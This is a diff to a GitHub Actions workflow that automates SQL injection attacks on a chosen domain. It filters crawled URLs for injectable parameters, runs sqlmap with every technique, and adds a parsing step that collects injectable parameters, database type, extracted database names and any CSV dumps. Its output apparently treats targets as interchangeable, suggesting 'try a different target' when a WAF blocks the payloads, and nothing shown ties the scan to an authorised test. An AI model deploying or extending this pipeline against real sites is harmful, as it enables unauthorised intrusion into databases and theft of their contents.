@@ -54,16 +54,12 @@ jobs:
 
       - name: Smart filter parameterized URLs
         run: |
-          # Keep only URLs with query params, strip wildcards
           grep '?' all_urls.txt | grep '=' | grep -v '\*' > step1.txt || true
 
-          # Remove tracking/affiliate/redirect/auth params
           grep -vP '(\?|&)(open|cda_id|cda_arg|cda_params|redirect_data|auth_secret|castId|sub[0-9]+|click_id|device.id|cdn_cache|cfuvid|cf_bm|utm_|fbclid|gclid|msclkid|token|affiliate|aff_|ref_click|impression|campaign)=' step1.txt > step2.txt || true
 
-          # Remove URLs where all param values look like base64/UUID/JWT (long random blobs)
           grep -vP '=[A-Za-z0-9+/\-_]{40,}' step2.txt > step3.txt || cp step2.txt step3.txt
 
-          # Deduplicate with uro
           cat step3.txt | uro > param_urls.txt || cp step3.txt param_urls.txt
 
           COUNT=$(wc -l < param_urls.txt)
@@ -72,7 +68,6 @@ jobs:
           if [ "$COUNT" -eq 0 ]; then
             echo "[!] No injectable URLs found after filtering."
             echo "[!] Target likely only exposes tracking/affiliate URLs publicly."
-            echo "[!] For authenticated endpoints, capture requests via Burp Suite."
             exit 1
           fi
 
@@ -102,18 +97,110 @@ jobs:
             --technique=BEUSTQ \
             2>&1 | tee sqlmap_output/sqlmap_full_log.txt
 
-          echo ""
-          echo "=== SCAN SUMMARY ==="
-          grep -E "CRITICAL|injectable|identified" sqlmap_output/sqlmap_full_log.txt | grep -v WAF || echo "[*] No injections found."
+      - name: Parse findings into findings.txt
+        if: always()
+        run: |
+          DOMAIN="${{ steps.target.outputs.domain }}"
+          LOGFILE="sqlmap_output/sqlmap_full_log.txt"
+          OUTFILE="sqlmap_output/findings.txt"
 
-      - name: Upload scan results
+          echo "================================================" > "$OUTFILE"
+          echo "  SQLMAP SCAN FINDINGS" >> "$OUTFILE"
+          echo "  Target : $DOMAIN" >> "$OUTFILE"
+          echo "  Date   : $(date -u)" >> "$OUTFILE"
+          echo "================================================" >> "$OUTFILE"
+          echo "" >> "$OUTFILE"
+
+          if [ ! -f "$LOGFILE" ]; then
+            echo "[-] Log file not found. Scan may not have run." >> "$OUTFILE"
+          else
+            # Check for injectable parameters
+            INJECTABLE=$(grep -i "parameter.*is vulnerable\|appears to be injectable\|sqlmap identified" "$LOGFILE" || true)
+
+            # Check for extracted databases
+            DATABASES=$(grep -A 50 "available databases" "$LOGFILE" | grep -E "^\[\*\]|\[#\]|^\s+\[" | head -30 || true)
+
+            # Check for backend DBMS info
+            DBMS=$(grep -i "the back-end DBMS is\|back-end DBMS:" "$LOGFILE" | head -5 || true)
+
+            # Check for OS/tech fingerprint
+            TECH=$(grep -i "web application technology\|web server operating system" "$LOGFILE" | head -5 || true)
+
+            # Grab all vulnerable URLs with their injection type
+            VULN_URLS=$(grep -B 2 "appears to be injectable\|is vulnerable" "$LOGFILE" | grep "GET\|POST\|URL:" | sort -u || true)
+
+            if [ -z "$INJECTABLE" ] && [ -z "$DATABASES" ]; then
+              echo "[RESULT] NOTHING FOUND" >> "$OUTFILE"
+              echo "" >> "$OUTFILE"
+              echo "No SQL injection vulnerabilities were detected on: $DOMAIN" >> "$OUTFILE"
+              echo "" >> "$OUTFILE"
+              echo "Possible reasons:" >> "$OUTFILE"
+              echo "  1. Target is behind Cloudflare WAF blocking all payloads" >> "$OUTFILE"
+              echo "  2. No real database-backed parameters found in public URLs" >> "$OUTFILE"
+              echo "  3. Parameters exist but are not injectable" >> "$OUTFILE"
+              echo "" >> "$OUTFILE"
+              echo "Suggestion: Try a different target or use authenticated requests via Burp." >> "$OUTFILE"
+            else
+              echo "[RESULT] VULNERABILITIES FOUND" >> "$OUTFILE"
+              echo "" >> "$OUTFILE"
+
+              if [ -n "$VULN_URLS" ]; then
+                echo "--- VULNERABLE URLs ---" >> "$OUTFILE"
+                echo "$VULN_URLS" >> "$OUTFILE"
+                echo "" >> "$OUTFILE"
+              fi
+
+              if [ -n "$INJECTABLE" ]; then
+                echo "--- INJECTABLE PARAMETERS ---" >> "$OUTFILE"
+                echo "$INJECTABLE" >> "$OUTFILE"
+                echo "" >> "$OUTFILE"
+              fi
+
+              if [ -n "$DBMS" ]; then
+                echo "--- DATABASE TYPE ---" >> "$OUTFILE"
+                echo "$DBMS" >> "$OUTFILE"
+                echo "" >> "$OUTFILE"
+              fi
+
+              if [ -n "$DATABASES" ]; then
+                echo "--- EXTRACTED DATABASES ---" >> "$OUTFILE"
+                echo "$DATABASES" >> "$OUTFILE"
+                echo "" >> "$OUTFILE"
+              fi
+
+              if [ -n "$TECH" ]; then
+                echo "--- SERVER/TECH FINGERPRINT ---" >> "$OUTFILE"
+                echo "$TECH" >> "$OUTFILE"
+                echo "" >> "$OUTFILE"
+              fi
+
+              # Also copy the full CSV results if sqlmap made one
+              CSV=$(find sqlmap_output -name "*.csv" 2>/dev/null | head -1)
+              if [ -n "$CSV" ]; then
+                echo "--- SQLMAP CSV RESULTS ---" >> "$OUTFILE"
+                cat "$CSV" >> "$OUTFILE"
+                echo "" >> "$OUTFILE"
+              fi
+            fi
+          fi
+
+          echo "================================================" >> "$OUTFILE"
+          echo "" >> "$OUTFILE"
+          echo "[*] Full raw log: sqlmap_output/sqlmap_full_log.txt" >> "$OUTFILE"
+
+          echo ""
+          echo "=== FINDINGS SUMMARY ==="
+          cat "$OUTFILE"
+
+      - name: Upload results
         if: always()
         uses: actions/upload-artifact@v4
         with:
           name: sqlmap-results-${{ steps.target.outputs.domain }}
           path: |
+            sqlmap_output/findings.txt
+            sqlmap_output/sqlmap_full_log.txt
             sqlmap_output/
             param_urls.txt
-            step1.txt
             all_urls.txt
           retention-days: 14
